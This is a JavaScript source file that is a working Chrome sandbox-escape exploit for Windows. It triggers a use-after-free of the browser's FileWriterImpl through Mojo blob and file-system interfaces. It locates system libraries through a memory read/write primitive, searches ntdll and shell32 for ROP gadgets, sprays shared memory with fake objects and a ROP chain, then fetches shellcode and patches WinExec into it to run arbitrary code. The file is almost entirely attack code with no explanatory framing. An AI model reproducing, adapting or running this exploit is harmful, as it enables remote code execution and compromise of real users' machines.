// offset of the global mojo::Core object in chrome_child.dll
const kChromeChildCoreOffset  = 0x5318168n;

const kFileWriterImplSize = 0x140;

// target address for our heap/vm-spray, and the fake objects it will contain
const kSprayPtr = 0x40404040000n;

const kFileSystemOperationRunnerPtr = kSprayPtr;
const kFileSystemOperationNodePtr   = kSprayPtr + 0x100n;
const kFileSystemContextPtr         = kSprayPtr + 0x200n;
const kFileSystemBackendNodePtr     = kSprayPtr + 0x300n;
const kFileSystemBackendPtr         = kSprayPtr + 0x400n;
const kFileSystemBackendVtablePtr   = kSprayPtr + 0x500n;
const kStackPtr                     = kSprayPtr + 0x600n;
const kShellcodePtr                 = kSprayPtr + 0x800n;

const kStackSize = 0x200;
const kShellcodeSize = 0x800;

// libraries that we need to find in renderer address space
var chrome_child = null;
var kernel32 = null;
var ntdll = null;
var shell32 = null;

// pointers that we need for our pivot/rop chain
var virtual_alloc_ptr = 0n;
var virtual_protect_ptr = 0n;
var memcpy_ptr = 0n;
var shellexecutew_ptr = 0n;

var pivot_gadget_ptr = 0n;
var pop_gadget_ptr = 0n;
var ret_gadget_ptr = 0n;
var mov_rcx_rax_gadget_ptr = 0n;
var jmp_rcx_gadget_ptr = 0n;
var shell32_mov_rcx_rax_gadget_ptr = 0n;
var shell32_mov_rax_rcx_gadget_ptr = 0n;

// pointers that we need to patch into our payload
var winexec_ptr = 0n;

// mojo interfaces to the browser process
var blob_registry_ptr = null;
var file_system_manager_ptr = null;

function bind_interfaces() {
  print('[1] bind_interfaces');
  blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                     mojo.makeRequest(blob_registry_ptr).handle, "process");
  print('  [*] blink::mojom::BlobRegistry');

  file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                     mojo.makeRequest(file_system_manager_ptr).handle, "process");
  print('  [*] blink::mojom::FileSystemManager');
}

function find_libraries(oob) {
  print('[2] find_libraries');

  let window_ptr = oob.objToPtr(window);
  let chrome_child_ptr = oob.getUint64(window_ptr + 0x20n);

  chrome_child = new pe64(oob, chrome_child_ptr);
  print('  [*] chrome_child:              0x' + chrome_child.base.toString(16));

  virtual_alloc_ptr = chrome_child.getImport('KERNEL32.dll', 'VirtualAlloc');
  print('    [-] kernel32!VirtualAlloc:   0x' + virtual_alloc_ptr.toString(16));

  kernel32 = new pe64(oob, virtual_alloc_ptr);
  print('  [*] kernel32:                  0x' + kernel32.base.toString(16));

  virtual_protect_ptr = kernel32.getExport('VirtualProtect');
  print('    [-] kernel32!VirtualProtect: 0x' + virtual_protect_ptr.toString(16));

  winexec_ptr = kernel32.getExport('WinExec');
  print('    [-] kernel32!WinExec:        0x' + winexec_ptr.toString(16));

  memcpy_ptr = kernel32.getImport('ntdll.dll', 'memcpy');
  print('    [-] ntdll!memcpy:            0x' + memcpy_ptr.toString(16));

  ntdll = new pe64(oob, memcpy_ptr);
  print('  [*] ntdll:                     0x' + ntdll.base.toString(16));

  pivot_gadget_ptr = ntdll.getGadget([
      0x48, 0x8b, 0x51, 0x50, // mov rbx, qword ptr [rcx+50h]
      0x48, 0x8b, 0x69, 0x18, // mov rbp, qword ptr [rcx+18h]
      0x48, 0x8b, 0x61, 0x10, // mov rsp, qword ptr [rcx+10h]
      0xff, 0xe2              // jmp rdx
    ]);
  print('    [-] pivot_gadget:            0x' + pivot_gadget_ptr.toString(16));

  pop_gadget_ptr = ntdll.getGadget([
      0x5a,                   // pop rdx
      0x59,                   // pop rcx
      0x41, 0x58,             // pop r8
      0x41, 0x59,             // pop r9
      0x41, 0x5a,             // pop r10
      0x41, 0x5b,             // pop r11
      0xc3                    // ret
    ]);
  ret_gadget_ptr = pop_gadget_ptr + 10n;
  print('    [-] pop_gadget:              0x' + pop_gadget_ptr.toString(16));

  mov_rcx_rax_gadget_ptr = ntdll.getGadget([
      0x48, 0x8b, 0xc8,       // mov rcx, rax
      0x48, 0x8b, 0xc1,       // mov rax, rcx
      0x48, 0x83, 0xc4, 0x28, // add rsp, 28h
      0xc3                    // ret
    ])
  print('    [-] mov_rcx_rax_gadget:      0x' + mov_rcx_rax_gadget_ptr.toString(16));

  jmp_rcx_gadget_ptr = ntdll.getGadget([
      0xff, 0xe1              // jmp rcx
    ])
  print('    [-] jmp_rcx_gadget:          0x' + jmp_rcx_gadget_ptr.toString(16));

  // newer versions of ntdll do not have the mov_rcx_rax_gadget_ptr gadget
  if (mov_rcx_rax_gadget_ptr == 0n) {
    print('  [*] chrome_child:');

    shellexecutew_ptr = chrome_child.getImport('SHELL32.dll', 'ShellExecuteW');
    print('    [-] shell32!ShellExecuteW:   0x' + shellexecutew_ptr.toString(16));

    shell32 = new pe64(oob, shellexecutew_ptr);
    print('  [*] shell32:                  0x' + shell32.base.toString(16));

    shell32_mov_rcx_rax_gadget_ptr = shell32.getGadget([
      0x48, 0x8B, 0xC8,       // mov rcx, rax
      0x48, 0x85, 0xC9,       // test rcx, rcx
      0x0F, 0x95, 0xC0,       // setne al
      0xC3                    // ret
    ]);
    print('    [-] shell32_mov_rcx_rax_gadget:            0x' + shell32_mov_rcx_rax_gadget_ptr.toString(16));

    shell32_mov_rax_rcx_gadget_ptr = shell32.getGadget([
      0x48, 0x8B, 0xC1,       // mov rax, rcx
      0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
      0xC3                    // ret
    ]);
    print('    [-] shell32_mov_rax_rcx_gadget:            0x' + shell32_mov_rax_rcx_gadget_ptr.toString(16));
  }

}

async function build_shellcode() {
  let shellcode = new DataView(await (await fetch('/shellcode.bin')).arrayBuffer());
  // patch pointer to WinExec into the shellcode.
  for (var i = 0; i < shellcode.byteLength; ++i) {
    if (shellcode.getBigUint64(i, true) == 0x2323232323232323n) {
      shellcode.setBigUint64(i, winexec_ptr, true);
      break;
    }
  }
  return shellcode;
}

function build_rop_stack() {
  let stack = new DataView(new ArrayBuffer(kStackSize));
  let i = 0;

  function push(value) {
    stack.setBigUint64(i, value, true);
    i += 8;
  }

  function call(fn_ptr, arg0=0x2323232323232323n, arg1=0x2323232323232323n, 
      arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
    push(pop_gadget_ptr);

    push(arg1); // rdx
    push(arg0); // rcx
    push(arg2); // r8
    push(arg3); // r9
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(fn_ptr);

    // leave scratch space
    push(pop_gadget_ptr);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
  }

  function chained_call(fn_ptr, arg1=0x2323232323232323n, 
      arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
    // first load arg1, arg2, arg3 into rdx, r8, r9 preserving rax, then move
    // rax into rcx and call the function
    push(pop_gadget_ptr);

    push(arg1); // rdx
    push(0x2323232323232323n);
    push(arg2); // r8
    push(arg3); // r9
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    if (mov_rcx_rax_gadget_ptr != 0n) {
      push(mov_rcx_rax_gadget_ptr);
    }
    else {
      push(shell32_mov_rcx_rax_gadget_ptr);
      push(shell32_mov_rax_rcx_gadget_ptr);
    }

    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(fn_ptr);

    // leave scratch space
    push(pop_gadget_ptr);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n); 
  }

  call(
    virtual_alloc_ptr, 0n, 0x1000n, 0x3000n, 0x4n);
  chained_call(
    memcpy_ptr, kShellcodePtr, BigInt(kShellcodeSize));
  chained_call(
    virtual_protect_ptr, BigInt(kShellcodeSize), 0x20n, kShellcodePtr);
  push(
    jmp_rcx_gadget_ptr);

  return stack;
}

async function build_page() {
  print('[3] build_page');

  let page = new DataView(new ArrayBuffer(0x1000));
  let stack = build_rop_stack();
  let shellcode = await build_shellcode();

  // storage::FileSystemOperationRunner
  page.setBigUint64(0x008, kFileSystemContextPtr, true);
  page.setBigUint64(0x018, kFileSystemOperationNodePtr, true);
  page.setBigUint64(0x020, 0n, true);

  // std::map<int, std::unique_ptr<storage::FileSystemOperationRunner::FileSystemOperation>>::node
  page.setBigUint64(0x100, kFileSystemOperationNodePtr, true); // left
  page.setBigUint64(0x108, kFileSystemOperationNodePtr, true); // parent
  page.setBigUint64(0x110, kFileSystemOperationNodePtr, true); // right
  page.setUint8(    0x118, 0);                                 // color
  page.setUint8(    0x119, 1);                                 // isnil
  page.setBigUint64(0x120, 0n, true);                          // key
  page.setBigUint64(0x128, 0n, true);                          // value

  // storage::FileSystemContext
  page.setBigUint64(0x278, kFileSystemBackendNodePtr, true);

  // std::map<storage::FileSystemType,storage::FileSystemBackend*>::node
  page.setBigUint64(0x300, kFileSystemBackendNodePtr, true);         // left
  page.setBigUint64(0x308, kFileSystemBackendNodePtr + 0x30n, true); // parent
  page.setBigUint64(0x310, kFileSystemBackendNodePtr, true);         // right
  page.setUint8(    0x318, 0);                                       // color
  page.setUint8(    0x319, 1);                                       // isnil
  page.setBigUint64(0x320, 0n, true);                                // key
  page.setBigUint64(0x328, 0n, true);                                // value

  page.setBigUint64(0x330, kFileSystemBackendNodePtr, true);         // left
  page.setBigUint64(0x338, kFileSystemBackendNodePtr, true);         // parent
  page.setBigUint64(0x340, kFileSystemBackendNodePtr, true);         // right
  page.setUint8(    0x348, 0);                                       // color
  page.setUint8(    0x349, 0);                                       // isnil
  page.setBigUint64(0x350, 0n, true);                                // key
  page.setBigUint64(0x358, kFileSystemBackendPtr, true);             // value

  // storage::FileSystemBackend
  page.setBigUint64(0x400, kFileSystemBackendVtablePtr, true);
  page.setBigUint64(0x410, kStackPtr, true);
  page.setBigUint64(0x450, ret_gadget_ptr, true);

  // storage::FileSystemBackend::`vftable`
  page.setBigUint64(0x538, pivot_gadget_ptr, true);

  for (var i = 0; i < stack.byteLength; ++i) {
    page.setUint8(0x600 + i, stack.getUint8(i));
  }

  for (var i = 0; i < shellcode.byteLength; ++i) {
    page.setUint8(0x800 + i, shellcode.getUint8(i));
  }

  return page;
}

function build_file_writer_impl() {
  print('[4] build_file_writer_impl');

  var file_writer_impl = new DataView(new ArrayBuffer(0x140));

  file_writer_impl.setBigUint64(0x08, kFileSystemOperationRunnerPtr, true);
  file_writer_impl.setUint8(    0x20, 1) // url.is_valid_

  return file_writer_impl;
}

function spray(oob, page_data) {
  print('[5] spray');

  const kPageSize     = 0x1000;
  const kHugePageSize = 0x40000000;

  function get_mojo_handle(oob, object) {
    let object_ptr = oob.objToPtr(object);
    let object_handle_ptr = oob.getUint64(object_ptr + 0x20n);
    let object_handle = oob.getUint32(object_handle_ptr + 0x10n);
    return object_handle;
  }

  let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
  let shared_memory_handle = get_mojo_handle(oob, shared_memory);

  print('  [*] initializing shared memory');
  var page_view = new DataView(page_data);
  for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
    let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
    let shared_view = new DataView(shared_buffer.buffer);
    for (var j = 0; j < kPageSize; j += 4) {
      shared_view.setUint32(j, page_view.getUint32(j));
    }
  }

  print('  [*] creating pipes and dupes');
  let pipes = [];
  let dupes = [];
  let pipe_handles = new Set([]);
  let dupe_handles = new Set([]);
  for (var i = 0; i < 2*0xc88; ++i) {
    let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: 0x1000});
    let dupe = shared_memory.duplicateBufferHandle();
    let pipe_handle = get_mojo_handle(oob, pipe.consumer);
    let dupe_handle = get_mojo_handle(oob, dupe.handle);

    pipes.push(pipe);
    dupes.push(dupe);
    pipe_handles.add(pipe_handle);
    dupe_handles.add(dupe_handle);
  }

  let mojo_core_ptr = oob.getUint64(chrome_child.base + kChromeChildCoreOffset);
  // this is the member handles_ of the mojo::Core object.
  let mojo_handles_ptr = oob.getUint64(mojo_core_ptr + 0x20n);

  let pipe_dispatchers = [];
  let dupe_dispatchers = [];

  var list_node_ptr = oob.getUint64(mojo_handles_ptr + 0x10n);
  let list_length = oob.getUint64(mojo_handles_ptr + 0x18n);
  for (var i = 0; i <= list_length; ++i) {
    let list_node_handle = oob.getUint32(list_node_ptr + 0x10n);
    let list_node_dispatcher = oob.getUint64(list_node_ptr + 0x18n);
    if (pipe_handles.has(list_node_handle)) {
      pipe_dispatchers.push(list_node_dispatcher);
    } else if (dupe_handles.has(list_node_handle)) {
      dupe_dispatchers.push(list_node_dispatcher);
    }
    list_node_ptr = oob.getUint64(list_node_ptr);
  }

  for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
    oob.memswap(pipe_dispatchers[i] + 0x80n,
                dupe_dispatchers[i] + 0x20n,
                0x28n);

    oob.setUint32(pipe_dispatchers[i] + 0x18n, 0x40000000);
    oob.setUint32(pipe_dispatchers[i] + 0x1cn, 0x40000000);
  }

  print('  [*] spraying');
  let ab = new ArrayBuffer(1);
  for (var i = 0; i < pipes.length; ++i) {
    blob_registry_ptr.registerFromStream("", "", 0x1, pipes[i].consumer, null);
    pipes[i].producer.writeData(ab);
  }

  return () => {
    print('[7] freeing spray')
    let ab = new ArrayBuffer(0xfff);
    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.writeData(ab);
    }

    print('[7] freeing spray2')

    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.close();
    }


    for (var i = 0; i < dupes.length; ++i) {
      dupes[i].handle.close();
    }
    print('[7] done');
  };
}

async function register_blob_0() {
  print('[6] register_blob_0');

  function BytesProviderImpl() {
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  }

  let bytes_provider = new BytesProviderImpl();
  let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
  bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));

  let blob_ptr = new blink.mojom.BlobPtr();
  let blob_req = mojo.makeRequest(blob_ptr);

  let data_element = new blink.mojom.DataElement();
  data_element.bytes = new blink.mojom.DataElementBytes();
  data_element.bytes.length = 1;
  data_element.bytes.embeddedData = [0];
  data_element.bytes.data = bytes_provider_ptr;

  await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);

  return blob_ptr;
}

function Allocation(size=280) {
  function ProgressClient() {
    function ProgressClientImpl() {
    }

    ProgressClientImpl.prototype = {
      onProgress: async (arg0) => {
      }
    };

    var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
    var progress_client_req = mojo.makeRequest(progress_client_ptr);
    var progress_client_binding = new mojo.AssociatedBinding(
      blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

    return progress_client_ptr;
  }

  this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
  this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

  this.malloc = function(data) {
    this.pipe.producer.writeData(data);
  }

  this.free = function() {
    this.pipe.producer.close();
  }

  return this;
}

async function file_writer(oob) {
  print('[file_writer]');

  const kAllocationCount = 0x8000;

  bind_interfaces();
  find_libraries(oob);
  let page = await build_page();
  let file_writer_impl = build_file_writer_impl();

  let heap = new Array(kAllocationCount);
  for (var i = 0; i < kAllocationCount; ++i) {
    heap[i] = new Allocation(kFileWriterImplSize);
  }

  let host_url = new url.mojom.Url();
  host_url.url = window.location.href;

  let open_result = await file_system_manager_ptr.open(host_url, 0);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  var create_writer_result = await file_system_manager_ptr.createWriter(file_url);

  function Blob0Impl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  Blob0Impl.prototype = {
    getInternalUUID: async (arg0) => {
      print('  [!] freeing FileWriterImpl');
      create_writer_result.writer.ptr.reset();

      for (var i = 0; i < kAllocationCount; ++i) {
        heap[i].malloc(file_writer_impl.buffer);
      }

      cleanup = spray(oob, page.buffer);
      oob.cleanup();
      register_blob_0();

      cleanup();

      return {'uuid': 'blob_0'};
    }
  };

  let blob_impl = new Blob0Impl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
  create_writer_result.writer.write(0, blob_impl_ptr);

  setTimeout(function(){
    for (var i = 0; i < kAllocationCount; ++i) {
      heap[i].free();
    }
  }, 5000);
}
